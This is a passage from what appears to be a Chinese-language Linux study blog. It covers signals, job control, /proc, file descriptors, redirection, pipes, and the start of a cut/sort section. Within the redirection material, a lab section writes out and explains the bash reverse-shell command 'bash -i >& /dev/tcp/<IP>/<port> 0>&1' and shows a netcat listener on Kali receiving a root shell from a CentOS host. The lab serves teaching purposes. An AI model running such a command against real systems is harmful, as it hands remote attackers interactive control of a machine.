是最后手段：可能丢失数据（直接杀进程，内核回收资源）。\n\n3.完整信号列表\n\n\n编号\n信号\n作用\n\n\n\n1\nSIGHUP\n控制终端挂起（常用于重载配置）\n\n\n2\nSIGINT\n中断（Ctrl+C）\n\n\n3\nSIGQUIT\n退出（生成 Core Dump）\n\n\n4\nSIGILL\n非法指令（通常因程序损坏触发）\n\n\n5\nSIGTRAP\n调试陷阱（如断点命中）\n\n\n6\nSIGABRT\n进程调用 abort() 时触发\n\n\n7\nSIGBUS\n总线错误（内存访问越界）\n\n\n8\nSIGFPE\n算术异常（除以零）\n\n\n9\nSIGKILL\n强制终止（无法被捕获&#x2F;阻塞）\n\n\n10\nSIGUSR1\n用户自定义信号 1（可由程序自定义行为）\n\n\n11\nSIGSEGV\n段错误（非法内存访问）\n\n\n12\nSIGUSR2\n用户自定义信号 2\n\n\n13\nSIGPIPE\n管道破裂（写入无读端的管道）\n\n\n14\nSIGALRM\n定时器超时（alarm() 触发）\n\n\n15\nSIGTERM\n优雅终止（默认信号）\n\n\n16\nSIGSTKFLT\n协处理器栈错误\n\n\n17\nSIGCHLD\n子进程结束通知父进程\n\n\n18\nSIGCONT\n继续执行被暂停的进程\n\n\n19\nSIGSTOP\n强制暂停进程（不可被捕获&#x2F;忽略）\n\n\n20\nSIGTSTP\n终端暂停（Ctrl+Z，可捕获）\n\n\n21\nSIGTTIN\n后台进程尝试读取终端输入\n\n\n22\nSIGTTOU\n后台进程尝试写入终端输出\n\n\n23\nSIGURG\n套接字紧急数据到达\n\n\n24\nSIGXCPU\nCPU 时间超限\n\n\n25\nSIGXFSZ\n文件大小超限\n\n\n26\nSIGVTALRM\n虚拟定时器超时（setitimer(ITIMER_VIRTUAL) 触发）\n\n\n27\nSIGPROF\n性能分析定时器超时\n\n\n28\nSIGWINCH\n终端窗口大小改变（如调整 SSH 会话窗口）\n\n\n29\nSIGIO\n异步 I&#x2F;O 事件（fcntl() 设置）\n\n\n30\nSIGPWR\n电源故障&#x2F;恢复\n\n\n31\nSIGSYS\n系统调用错误（参数无效）\n\n\n34\nSIGRTMIN\n实时信号起始值（SIGRTMIN 到 SIGRTMAX 共 32 个）\n\n\n💡 实时信号说明：SIGRTMIN 到 SIGRTMAX（通常 34~64）是可靠信号，用于自定义高优先级通信（按队列处理，不丢失）。\n4.实验（1）启动一个httpd服务（会产生多个进程）1[root@wyf 桌面]# systemctl restart httpd\n\n（2）查找所有httpd进程12345678[root@wyf 桌面]# ps -ef | grep httpdroot       4987      1  0 18:42 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND#4987是httpd服务的主进程，其他都是子进程apache     5007   4987  0 18:42 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5008   4987  0 18:42 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5009   4987  0 18:42 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5010   4987  0 18:42 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDroot       5354   2777  0 18:52 pts/0    00:00:00 grep --color=auto httpd\n\n（3）对httpd 的主进程发送信号112345678[root@wyf 桌面]# kill -1 4987                   #当服务配置变更以后，可以通过-1来刷新主进程[root@wyf 桌面]# ps -ef | grep httpd            #主进程pid没变，子进程Pid全变了root       4987      1  0 18:42 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5383   4987  0 18:54 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5384   4987  0 18:54 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5385   4987  0 18:54 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5386   4987  0 18:54 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDroot       5607   2777  0 18:55 pts/0    00:00:00 grep --color=auto httpd\n\n（4）对httpd的主进程发送信号15，查看服务状态1234567891011121314151617181920[root@wyf 桌面]# kill -15 4987[root@wyf 桌面]# ps -ef | grep httpdroot       5632   2777  0 18:56 pts/0    00:00:00 grep --color=auto httpd[root@wyf 桌面]# ps -ef | grep httpd | grep -v grep[root@wyf 桌面]# systemctl status httpd● httpd.service - The Apache HTTP Server   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor prese&gt;   Active: inactive (dead) since Wed 2025-08-06 18:56:26 CST; 29s ago     Docs: man:httpd.service(8)  Process: 4987 ExecStart=/usr/sbin/httpd $OPTIONS -DFOREGROUND (code=exited, s&gt; Main PID: 4987 (code=exited, status=0/SUCCESS)   Status: &quot;Running, listening on: port 80&quot;8月 06 18:42:12 wyf systemd[1]: Starting The Apache HTTP Server...8月 06 18:42:37 wyf httpd[4987]: AH00558: httpd: Could not reliably determine t&gt;8月 06 18:42:37 wyf systemd[1]: Started The Apache HTTP Server.8月 06 18:42:52 wyf httpd[4987]: Server configured, listening on: port 808月 06 18:54:43 wyf httpd[4987]: Server configured, listening on: port 80[root@wyf 桌面]# \n\n（5）重新启动httpd服务，对主进程发送信号912345678910[root@wyf 桌面]# systemctl restart httpd[root@wyf 桌面]# ps -ef | grep httpd | grep -v greproot       5669      1  0 18:57 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5693   5669  0 18:57 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5694   5669  0 18:57 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5695   5669  0 18:57 ?        00:00:00 /usr/sbin/httpd -DFOREGROUNDapache     5696   5669  0 18:57 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND[root@wyf 桌面]# kill -9 5669[root@wyf 桌面]# ps -ef | grep httpd | grep -v grep[root@wyf 桌面]#                    #所有进程都没了（centos8中子进程依然存在，可以提供服务）\n\n5、进程优先级Nice值：用户空间进程的静态优先级，影响内核调度器分配 CPU 时间的权重。\n\n\n\n用户类型\nnice 值范围\n实际优先级\n\n\n\n普通用户\n0 ~ 19\n低优先级（值越大，优先级越低）\n\n\nroot 用户\n-20 ~ 19\n高优先级（值越小，优先级越高）\n\n\n1ps axo pid,command,nice --sort=-nice\n\n6、作业控制Linux可以在一个终端中管理多个任务进程（这些进程称之为job）。 有些进程会占用终端运行很久或是一直占用终端，那么想要运行第二进程 就无法操作了，所以进程可以放到后台执行，这样就不影响在同一个 终端运行第二个进程了。  \n1.前后台管理12345678910111213141516171819202122[root@wyf 桌面]# jobs -l                            #查看当前终端运行的job，目前为空[root@wyf 桌面]# sleep 100000                       #此命令为等待100000秒，也就是说会占用终端100000秒^C                                                 #使用ctrl+c取消，此时sleep 100000还没有[root@wyf 桌面]# sleep 100000&amp;                      # &amp;为后台符号，这样sleep 100000可以在终端后台继续运行[1] 6418[root@wyf 桌面]# ps -ef | grep sleeproot       6410   1105  0 19:17 ?        00:00:00 sleep 60root       6418   2777  0 19:18 pts/0    00:00:00 sleep 100000root       6426   2777  0 19:18 pts/0    00:00:00 grep --color=auto sleep[root@wyf 桌面]# jobs -l                            #jobs -l可以查看到了[1]+  6418 运行中               sleep 100000 &amp;[root@wyf 桌面]# fg %1                              # fg命令将job由后台转到终端前台运行，%1代表第1个jobsleep 100000^Z                                                 #按ctrl+z可以将占用前台的进程转到后台暂停执行[1]+  已停止               sleep 100000[root@wyf 桌面]# jobs -l[1]+  6418 停止                  sleep 100000       #确认为stop状态[root@wyf 桌面]# bg %1                              # bg命令将后台stopped状态的进程转为后台[1]+ sleep 100000 &amp;[root@wyf 桌面]# jobs -l[1]+  6418 运行中               sleep 100000 &amp;      #确认为运行状态[root@wyf 桌面]# \n\n2.注意！！！​\tkill 1：终止PID为1的进程（系统进程） \n​\tkill %1：终止作业号为1的后台进程\n7、虚拟文件系统 proc123/proc/cpuinfo           # CPU信息/proc/meminfo           # 内存信息/proc/cmdline           # 内核启动参数\n\n12cat /proc/cpuinfo       # 查看CPU详情less /proc/meminfo      # 查看内存使用\n\n","slug":"进程管理","date":"2025-08-06T02:29:29.000Z","categories_index":"","tags_index":"Linux","author_index":"wyf"},{"id":"af2db19dd72297d09de218eff118e887","title":"重定向和管道","content":"重定向和管道一、重定向1.文件描述符（FD）定义：在 Linux 中，文件描述符（File Descriptor）是一个非负整数，用于唯一标识一个进程（程序） 打开的文件、管道、网络连接或其他 I&#x2F;O 资源。它是操作系统管理 I&#x2F;O 操作的抽象句柄。 \n本质：可以理解为操作系统为每个进程维护的“通道号码”，通过这个号码访问具体的 I&#x2F;O 资源。\n2.标准输入、标准输出、标准错误输出Linux 为每个进程默认打开三个标准流（Standard Streams），对应三个文件描述符： \n1.标准输入（stdin, FD 0）： \n​\t默认来源：键盘输入。 \n​\t用途：程序从 stdin 读取输入数据。 \n2.标准输出（stdout, FD 1）： \n​\t默认去向：终端屏幕。 \n​\t用途：程序向 stdout 输出正常结果。 \n3.标准错误输出（stderr, FD 2）： \n​\t默认去向：终端屏幕。 \n​\t用途：程序向 stderr 输出错误信息（与正常结果分离）。\n举个例子：通过我们非常熟悉的VIM程序。来观察一个进程的FD信息 \n​\t1.通过一个终端，打开一个文本。\n1[root@wyf 桌面]# vim 111.txt\n\n​\t2.通过另一个终端，查询文本程序的进程号\n123[root@wyf 桌面]# ps  aux| grep vimroot       8133  0.0  0.2  46596  8604 pts/0    S+   18:23   0:00 vim 111.txtroot       8170  0.0  0.0  12320   976 pts/1    S+   18:23   0:00 grep --color=auto vim\n\n\n​\t3.在 &#x2F;proc 目录中查看文本程序的FD，通常在 &#x2F;proc&#x2F;PID&#x2F;fd  就能看到文件的FD调用情况。\n123456789101112131415161718[root@wyf 桌面]# cd ..[root@wyf ~]# cd /proc/8133[root@wyf 8133]# ls                       ## fd  就是PID号为8133进程vim的文件描述符attr             exe        mounts         projid_map    statusautogroup        fd         mountstats     root          syscallauxv             fdinfo     net            sched         taskcgroup           gid_map    ns             schedstat     timersclear_refs       io         numa_maps      sessionid     timerslack_nscmdline          limits     oom_adj        setgroups     uid_mapcomm             loginuid   oom_score      smaps         wchancoredump_filter  map_files  oom_score_adj  smaps_rollupcpuset           maps       pagemap        stackcwd              mem        patch_state    statenviron          mountinfo  personality    statm[root@wyf 8133]# cd fd[root@wyf fd]# ls0  1  2  3  4  6[root@wyf fd]# \n\n​\t4.使用 ll 命令查看一下句柄\n12345678[root@wyf fd]# ll总用量 0lrwx------. 1 root root 64 8月   5 18:27 0 -&gt; /dev/pts/0lrwx------. 1 root root 64 8月   5 18:27 1 -&gt; /dev/pts/0lrwx------. 1 root root 64 8月   5 18:27 2 -&gt; /dev/pts/0lr-x------. 1 root root 64 8月   5 18:27 3 -&gt; /var/lib/sss/mc/passwdlrwx------. 1 root root 64 8月   5 18:27 4 -&gt; &#x27;socket:[111322]&#x27;lrwx------. 1 root root 64 8月   5 18:27 6 -&gt; /root/桌面/.111.txt.swp\n\n​\t5.&#x2F;dev&#x2F;pts&#x2F;0 是我之前打开vim的终端，用执行 ps 命令的终端输入，可以将标准输出重定向 到&#x2F; dev&#x2F;pts&#x2F;0\n1[root@wyf fd]# echo 111111 &gt;&gt; /dev/pts/0\n\n\n 6.&#x2F;root&#x2F;.111.txt.swp 是编辑文件时产生的临时文件\n​\t(1) 正常保存退出\n​\t\t行为：编辑器会将修改写入源文件（如  1.txt ），删除交换文件（ .111.txt.swp ）。\n​\t\t结果：源文件更新，交换文件消失。 \n​\t(2) 不保存退出（如  :q! ） \n​\t\t行为：编辑器会丢弃所有未保存的修改，删除交换文件。 \n​\t\t结果：源文件保持原样，交换文件消失。\n​\t (3) 意外退出（如崩溃、断网） \n​\t\t行为：交换文件保留，下次打开文件时，编辑器会提示：\n12发现交换文件 &quot;.111.txt.swp&quot;选择: (R)恢复修改, (D)删除交换文件, (Q)退出, (A)终止\n\n​\t\t恢复操作：\n​\t\t\t选择 R（恢复）：将交换文件内容加载到编辑器，合并未保存的修改。 \n​\t\t\t选择 D（删除交换文件）：放弃恢复，直接编辑源文件。\n3.总结看到的012就是FD，程序通过描述符访问文件，可以是常规文件，也可以是设备文件。\n4.重定向练习\n1.输出重定向及综合案例案例1：输出重定向1234567[root@wyf 桌面]# date &gt; date.txt[root@wyf 桌面]# cat date.txt2025年 08月 05日 星期二 18:37:30 CST[root@wyf 桌面]# date &gt;&gt; date.txt[root@wyf 桌面]# cat date.txt2025年 08月 05日 星期二 18:37:30 CST2025年 08月 05日 星期二 18:37:55 CST\n\n12345[root@wyf 桌面]# mkdir 333 1&gt; 333.txt      #1表示正确输出[root@wyf 桌面]# cat 333.txt [root@wyf 桌面]# mkdir 444 -v 1&gt; 444.txt[root@wyf 桌面]# cat 444.txt mkdir: 已创建目录 &#x27;444&#x27;\n\n案例2：错误输出重定向当某条命令产生错误时，才会有错误输出。\n123[root@wyf 桌面]# ls /aaaaaaa 2&gt; error.txt   #2表示错误输出[root@wyf 桌面]# cat error.txt ls: 无法访问&#x27;/aaaaaaa&#x27;: 没有那个文件或目录\n\n案例3： 正确和错误都输入到相同位置12345678910[root@wyf 桌面]# ls /home/ /aaaaaa &amp;&gt;&gt; error.txt[root@wyf 桌面]# cat error.txt ls: 无法访问&#x27;/aaaaaa&#x27;: 没有那个文件或目录/home/:wyf[root@wyf 桌面]# ls /home /aaaaaaa &gt;&amp; error.txt[root@wyf 桌面]# cat error.txt ls: 无法访问&#x27;/aaaaaaa&#x27;: 没有那个文件或目录/home:wyf\n\n案例4：将 stdout 和 stderr 分别重定向到不同文件123456[root@wyf 桌面]# ls /home/ /aaaaaa 1&gt; output.txt 2&gt;error.txt[root@wyf 桌面]# cat output.txt /home/:wyf[root@wyf 桌面]# cat error.txt ls: 无法访问&#x27;/aaaaaa&#x27;: 没有那个文件或目录\n\n案例5：将 stderr 合并到 stdout，再一起重定向到文件1234567[root@wyf 桌面]# ls /home/ /aaaaaa &gt;all.log 2&gt;&amp;1   ##&amp;1表示文件描述符1而不是文件1[root@wyf 桌面]# cat all.log ls: 无法访问&#x27;/aaaaaa&#x27;: 没有那个文件或目录/home/:wyf #为什么不直接用`&amp;&gt;`兼容性问题:&amp;&gt; 是 •Bash 的扩展语法，并非所有 Shell 都支持，而 &gt; file 2&gt;&amp;1 是 POSIX 标准语法，兼容性更广  (而且显得更有水平，逻辑性更强！)\n\n2.输入重定向及结合案例案例：利用 cat 将输入文字输出到 catfile 中， 当输入 eof 时就结束12345678[root@wyf 桌面]# cat &gt;catfile &lt;&lt;&quot;eof&quot;&gt; asdfffads&gt; adsSFdff&gt; eof[root@wyf 桌面]# cat catfile asdfffadsadsSFdff[root@wyf 桌面]# \n\n二、bash反弹shell1.什么是内核（kernel)定义： \n​\t内核是操作系统的核心，直接管理计算机的硬件资源（CPU、内存、硬盘、网络等）。 \n职责：  \n​\t调度进程（决定哪个程序使用 CPU）。 \n​\t管理内存分配。 \n​\t控制硬件设备（如读写磁盘、处理网络请求）。 \n比喻：\n​\t内核就像一家公司的 CEO，负责所有核心决策和资源分配，但不直接面对普通员工（用户）。 \n2.什么是shell GNU &#x3D; GNU NOT UNIX定义： \n​\tShell 是用户与内核交互的“桥梁”，是一个命令行解释器。 \n职责： \n​\t接收用户输入的命令（如 ls、 cat ）。 \n​\t将命令翻译成内核能理解的操作。 \n​\t将内核的执行结果返回给用户。 \n常见 Shell 类型： \n​\tBash（Bourne-Again Shell）：Linux 系统默认的 Shell。 \n​\tZsh（Z Shell）：功能更强大的现代 Shell（如 Oh My Zsh）。 \n​\tFish：对新手友好的 Shell。 \n比喻： \n​\tShell 就像公司的中层经理，负责将员工的请求（用户命令）传达给 CEO（内核），再将 CEO 的反馈返 回给员工。 \n3.什么是bash定义： \n​\tBash 是 Shell 的一种具体实现，全称是 Bourne-Again Shell。 \n特点：  \n​\t支持命令历史、自动补全、脚本编程等。 \n​\tLinux 和 macOS 的默认 Shell（Windows 可通过 WSL 或 Git Bash 使用）。 \n示例：\n​\t当你在终端输入  ls -l，Bash 会： \n​\t1.解析命令。 \n​\t2.调用内核的“列出文件”功能。 \n​\t3.将结果（文件列表）输出到屏幕。 \n比喻：\n​\tBash 就像某个 特定部门的高效经理，既能处理常规任务（一些命令：echo、ls等），又能执行复杂流 程（如脚本）\n4.三者的关系bash 是 shell 的一种\n​\t1. 用户输入：在终端输入  cat file.txt。bash 命令\n123451、cat命令生成一个临时进程2、/proc/进程号/fd3、 0 1 24、/dev/pts/15、保存并返回给终端\n\n​\t2.Shell（Bash）解析：识别  cat 命令和参数  file.txt ，然后找到 \n​\t3.调用内核：bash 请求内核调用程序，并传递参数“  file.txt ”。 \n​\t4.内核执行： \n​\t\t检查文件权限。 \n​\t\t从硬盘读取文件数据。 \n​\t5.返回结果：内核将文件内容通过 Shell 返回给用户。\n5.bash反弹shell1bash -i &gt;&amp; /dev/tcp/192.168.20.151/8080 0&gt;&amp;1\n\n解读： \n​\tbash -i \n​\t\t打开一个交互的bash \n​\t&#x2F;dev&#x2F;tcp&#x2F; \n​\t\t是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接， 读写这个文件就相当于在这个socket连接中传输数据。同理，Linux中还存在&#x2F;dev&#x2F;udp&#x2F; \n​\t&#x2F;dev&#x2F;tcp&#x2F;192.168.119.131&#x2F;1234    \n​\t\t向192.168.119.131 主机的1234端口发起连接 \n​\tbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.119.131&#x2F;1234  \n​\t\t将标准输出和标准错误输出通过连接发送给192.168.119.131 \n​\tbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.119.131&#x2F;1234 0&gt;&amp;1 \n​\t\t将标准输入，重定向到标准输出（也通过连接发送给192.168.20.151的8080端口）\n6.实验1.开启kali,使用nc工具监听1234端口12345678┌──(root㉿kali)-[~]└─# nc -lvnp 1234               listening on [any] 1234 ...#nc 是 •netcat 的缩写，被称为“网络瑞士军刀”，用于处理 TCP/UDP 网络连接。它的常见用途包括端口监听、端口扫描、文件传输、网络调试等。-l  listen  •监听模式：等待传入连接（服务端模式）。-v  verbose •详细输出：显示连接/通信的详细信息（如对方 IP、端口）。-p  port    •指定端口：指定监听的端口号（某些版本中 -p 可省略，直接跟端口）。-n           禁用dns解析\n\n2.在Centos中，执行反弹shell的命令1[root@wyf 桌面]# bash -i &gt;&amp; /dev/tcp/192.168.232.134/1234 0&gt;&amp;1\n\n此时发现kali中返回了Centos 8 的终端页面，拿到了Centos 8 的执行权限\n12345678┌──(root㉿kali)-[~]└─# nc -lvnp 1234  listening on [any] 1234 ...connect to [192.168.232.134] from (UNKNOWN) [192.168.232.145] 59660[root@wyf 桌面]# hostnamehostnamewyf[root@wyf 桌面]# \n\n3.在Centos中执行命令，结果输出到kali中1[root@wyf 桌面]# bash &gt;&amp; /dev/tcp/192.168.232.134\n\n三、管道核心概念：\n什么是管道？ 想象一条单向传输带。在 Linux 命令行中，管道（|） 就像一个连接命令的“传输带”。它允许你将一个命令（左侧）的标准输出（stdout）直接作为另一个命令（右侧）的标准输入（stdin）传递过去。\n目的： 管道使得组合多个单一用途的小命令来完成复杂任务变得简单、高效。遵循了 Unix&#x2F;Linux “一个程序只做好一件事，并做好” 的哲学。\n单向流动： 数据通过管道从左向右流动。\n临时性： 管道传递的数据是临时的，不会自动保存到磁盘文件（除非你将最终结果重定向到文件）。数据在内存中流过。\n并行执行： 管道左右两侧的命令通常是同时启动和并行运行的。左侧命令产生的输出会立刻（或在其缓冲区满时）被右侧命令读取和处理。\n\n如何表示和使用：管道在命令行中使用竖线符号 | 表示。它的基本语法格式是：\n1command1 [arguments] | command2 [arguments]\n\n\ncommand1：产生输出的命令。\n|：管道符号。\ncommand2：接收输入并进一步处理的命令。\n\n关键特性与工作原理：\n连接标准输出到标准输入： 这是最核心的。command1 将其原本应该显示在屏幕上的输出（stdout），通过管道传给了 command2，变成了 command2 的输入（stdin）。\n\n避免临时文件： 在没有管道的年代，要达成类似效果，你需要将 command1 的输出重定向（&gt;）到一个临时文件，然后再让 command2 从这个临时文件读取（&lt;）。管道让你一步到位，更简洁高效，减少了磁盘 I&#x2F;O。\n\n过滤、转换和组合：\n 管道最常见的用途是让右侧的命令对左侧命令的输出进行：\n\n过滤（Filtering）： 只保留符合条件的行（例如 grep）。\n排序（Sorting）： 对输出行进行排序（例如 sort）。\n统计（Summarizing）： 统计行数、字数等（例如 wc）。\n格式转换（Transforming）： 修改输出的格式（例如 sed, awk, tr）。\n分页查看（Paging）： 查看长输出（例如 less, more）。\n合并结果： 将多个处理阶段串联起来。\n\n\n串联多个管道：\n 你可以连接多个管道，形成复杂的处理流水线：\n1command1 | command2 | command3 | ... | commandN\n\n每个阶段的结果都作为下一个阶段的输入。\n\n仅传递标准输出： 管道只传递标准输出（stdout）。标准错误（stderr） 默认情况下不受管道影响，会直接打印到终端。如果需要处理错误，需要特殊操作（如 2&gt;&amp;1）。\n\n缓冲区： 内核为管道维护一个内存缓冲区。左侧命令向缓冲区写入，右侧命令从缓冲区读取。缓冲区的存在使得两侧命令可以不完全同步地运行。\n\n\n为什么管道如此重要和强大？\n模块化： 将大而复杂的问题分解成一系列小而简单、职责单一的命令。\n可复用： 那些单一功能的命令（如 grep, sort, awk）可以被无数个不同的管道在不同的上下文中重用。\n效率高： 省去了创建临时文件的步骤，直接在内存中传递数据，速度更快。\n表达能力丰富： 通过组合简单的命令，可以构造出极其强大的数据处理流水线，完成很多复杂的文本或数据处理任务。\n命令行效率： 熟练掌握管道是高效使用 Linux&#x2F;Unix 命令行的关键标志。\n\n经典使用示例：\n查找并计数： 在当前目录及其子目录下查找所有包含 “error” 的 .log 文件，并统计出现次数：\n1grep -r &quot;error&quot; *.log | wc -l\n\n\ngrep -r &quot;error&quot; *.log: 递归查找 .log 文件中的 “error” 行（输出多行文本）。\n|: 将 grep 的输出传给 wc。\nwc -l: 统计接收到的输入的行数（即包含 “error” 的行数）。\n\n\n列出、排序、去重： 列出 /etc 目录下的文件（不包括隐藏文件），按名称排序，并显示唯一的扩展名：\n1ls /etc | grep -v &quot;^\\\\.&quot; | sort | cut -d &#x27;.&#x27; -f 2- | uniq\n\n\nls /etc: 列出 /etc 下的文件和目录（输出多行文本）。\ngrep -v &quot;^\\.&quot;: 过滤掉以 . 开头的行（排除隐藏文件，不完美但对简单示例有效）。\nsort: 对文件名按字母顺序排序（为 uniq 准备）。\ncut -d &#39;.&#39; -f 2-: 以 . 为分隔符，提取文件名中第一个 . 之后的部分（扩展名）。-f 2- 表示从第二个字段到最后一个字段。\nuniq: 只显示排序后列表中唯一的行（去除重复扩展名）。\n\n\n查看长列表分页： 列出 /usr/bin 目录的详细信息，并用 less 分页查看：\n1ls -l /usr/bin | less\n\n\nls -l /usr/bin: 产生长格式列表。\n| less: 将长输出传递给 less，方便分页、搜索和滚动浏览。\n\n\n监控日志： 实时监控日志文件，只显示包含 “Failed” 的行：\n1tail -f /var/log/syslog | grep &quot;Failed&quot;\n\n\ntail -f /var/log/syslog: 持续输出文件尾部新增的内容（实时追踪）。\n| grep &quot;Failed&quot;: 只将包含 “Failed” 的行显示在屏幕上。\n\n\n\n需要注意：\n错误流： 默认管道只处理标准输出。如果左侧命令产生大量错误信息（stderr），它们会混在终端输出中。如要重定向错误流到管道，需要用 2&gt;&amp;1 (将 stderr 合并到 stdout)，或者重定向错误到其他地方。\n只处理文本： 管道传递的是文本流。命令需要理解文本格式。二进制数据通常不适合管道处理（虽然也能传，但接收命令要能解析）。\n效率： 极其长的管道或多级管道可能效率不高，因为涉及多次程序启动和上下文切换。对于复杂数据处理，专用脚本语言（如 Python, Perl）或工具（如 awk 本身可以处理较复杂的逻辑）可能更高效。\n命名管道： 除了临时管道（匿名管道，用 | 创建），还有 命名管道（FIFO, First-In-First-Out），它是一个存在于文件系统的特殊文件，可以作为进程间通信的持久化通道（创建用 mkfifo）。\n\n好的，cut 和 sort 都是 Linux&#x2F;Unix 命令行中极其常用且强大的文本处理工具。它们常被用于管道 (|) 中，相互配合或与其他命令一起完成数据处理任务。\n让我们分别深入了解它们：\ncut：纵向剪切 - 提取文本的特定部分\n核心功能： 从输入行（通常是文件或管道传入的数据流）中，按列或按字段提取指定的部分（字节、字符、字段）。\n核心哲学： 用于垂直（按列&#x2F;字段）地切割文本行。\n常用选项：\n-d DELIMITER (或 --delimiter=DELIMITER)：指定字段分隔符。这是使用 -f 选项的关键前提！ 默认分隔符是制表符 (\\t)，但最常见的可能是空格或逗号（如 CSV 文件）。\n-f FIELDS(或 --fields=FIELDS)：指定要提取哪些字段（列）。字段编号从 1 开始。\n可以是单个数字：-f 3 (提取第3个字段)\n可以是用逗号分隔的多个数字：-f 1,3 (提取第1和第3个字段)\n可以是一个范围：-f 1-3 (提取第1到第3个字段)\n也可以是混合：-f 1,3-5,7 (提取1, 3到5, 7)\n\n\n-c CHARACTERS (或 --characters=CHARACTERS)：指定要提取哪些字符（或字节）位置（按位置，不依赖分隔符）。\n格式同 -f：-c 10 (第10个字符)， -c 5-10 (5到10个字符), -c 1,3,5-7 (1,3,5到7)\n\n\n-b BYTES (或 --bytes=BYTES)：类似 -c，但指定的是字节位置而不是字符位置（在纯 ASCII 文本中两者相同，但在包含多字节字符如 UTF-8 的文件中，-c 会正确处理字符，-b 则按字节切割可能切碎字符）。\n\n\n工作原理：\n对于每一行输入文本：\n使用 -d 和 -f: cut 会根据指定的分隔符 (-d) 将行分割成多个字段，然后只输出指定的字段编号 (-f)。\n使用 -c 或 -b: cut 会直接按照指定的字符或字节位置提取。\n\n\n经典用法与示例：\n提取 CSV 文件的特定列： cut -d&#39;,&#39; -f 1,4 employees.csv (假设员工 CSV 文件，以逗号分隔，提取姓名和工资列)。\n提取系统用户名 (/etc/passwd): /etc/passwd 文件以冒号 : 分隔，第一列是用户名： cut -d&#39;:&#39; -f 1 /etc/passwd (输出所有用户名)\n提取日志文件中的特定部分： 假设日志每行以空格分隔，第 5 列是 IP 地址： grep &quot;error&quot; application.log | cut -d&#39; &#39; -f 5\n提取固定宽度数据的列： 有时数据排列整齐但没用分隔符： ls -l | cut -c 1-10,48- (提取权限字段和文件名)\n提取每行的前 N 个字符： cut -c 1-10 somefile.txt\n\n\n重要注意点：\n分隔符陷阱： cut 对于连续的分隔符处理方式简单。如果一行中出现连续的分隔符（如两个空格），cut -f 可能会将空字段也算在内。这在使用空格分隔时尤其常见（因为单词间的空格数量可能不固定）。awk 在处理这类情况时通常更灵活（它会将连续空格视为一个分隔符）。\n字段顺序： 使用 -f 时，字段按编号顺序输出，顺序由 -f 参数指定。cut -f 3,1 会先输出第3个字段，再输出第1个字段。\n\n\n\nsort：横向排序 - 按行排序文本\n核心功能： 读取输入行（文件或管道），对它们进行排序（默认为按整行的字符串字典序升序排列），然后输出排序后的结果。\n\n核心哲学： 用于水平（整行）地对文本块进行排序或重组。\n\n强大之处： 不仅仅能按整行排序，还能按特定字段、数值大小、日期、忽略大小写等复杂规则排序。\n\n常用选项：\n\n-r (或 --reverse)：反向排序（降序）。\n\n-n (或 --numeric-sort)：按数值排序。对于包含数字的字段非常关键！默认排序是按字符串的字典序（”10” 会排在 “2” 前面，因为 ‘1’ &lt; ‘2’），使用 -n 会将字段解释为数字来排序（”2” &lt; “10”）。\n\n-k KEYDEF (或 --key=KEYDEF)：指定排序键（排序依据的关键部分）。这是最灵活、最强大的选项。KEYDEF的格式通常为 \n1[F[.C][OPTS]][, [F[.C][OPTS]]]\n\n\nF：字段编号（从 1 开始）。\n.C：从字段的第 C 个字符开始比较（字段的第一个字符是 1）。.C 可选，如果省略则从字段的第一个字符开始比较。\nOPTS：一个或多个排序选项字母（如 n - 数值， r - 反向， d - 字典序， i - 忽略不可打印字符， f - 忽略大小写等）。这些选项 仅应用于此键。\n可以指定多个 -k 选项或多个键定义。排序时先按第一个键排序，若第一个键相等再按第二个键排序，以此类推。\n示例：\nsort -k2,2n：按第二个字段（作为数值）排序。\nsort -k1,1f -k3,3rn：首先按第一个字段排序（忽略大小写），如果第一个字段相同，则按第三个字段排序（作为数值，降序）。\nsort -k3.2：按第三个字段的第二个字符开始排序（直到行尾或下一个键定义的开始）。\n\n\n\n\n-t DELIMITER (或 --field-separator=DELIMITER)：指定用于区分字段的分隔符，必须与 -k 选项配合使用。默认是空格，但常需要指定（如处理 CSV 或 /etc/passwd）。\n\n-u (或 --unique)：排序并去重（相当于 sort | uniq，但效率通常更高）。\n\n-f (或 --ignore-case)：排序时忽略大小写。\n\n-o FILE (或 --output=FILE)：将排序结果输出到文件（可以覆盖原文件）。优于使用 sort file &gt; file，因为后者可能会导致文件截断为空后读取。\n\n-b (或 --ignore-leading-blanks)：在比较字段时，忽略开头的空白字符（空格、制表符）。\n\n\n\n经典用法与示例：\n\n按字母顺序排序单词列表： \n1sort wordlist.txt\n\n按数字降序排序：\n1du -sh * | sort -hr\n\n（常用组合：du -sh *显示目录大小，sort -h 按人类可读格式排序 KiB, MiB 等）。\n\n注意： -h (human-readable) 选项是 GNU sort 的扩展，不是所有系统都有。在 macOS (BSD) 上需要用其他方式。\n\n\n按特定字段排序文件： 处理 /etc/passwd (冒号分隔)，按用户 ID (第三字段, 数字) 排序： sort -t&#39;:&#39; -k3n /etc/passwd\n\n多级排序： 处理员工 CSV (逗号分隔)：先按部门 (第2列) 升序排，相同部门内按工资 (第4列, 数值) 降序排： sort -t&#39;,&#39; -k2,2 -k4,4rn employees.csv\n\n排序并去重： sort -u usernames.txt\n\n忽略大小写排序： sort -f mixed_case.txt\n\n安全地覆盖原文件排序： sort input.txt -o input.txt\n\n\n\n\ncut 与 sort 的黄金组合这两个命令经常在管道中协同工作：\n\n流程： 通常是 cut 用来 提取 需要排序的关键列 -&gt; sort 对这些提取出来的列或数据行进行排序 -&gt; 可能再用其他命令处理排序结果。\n\n示例：\n找出最常用的命令：提取 history 输出的命令部分（忽略行号），排序、计数、再排序：\n1history | cut -c 8- 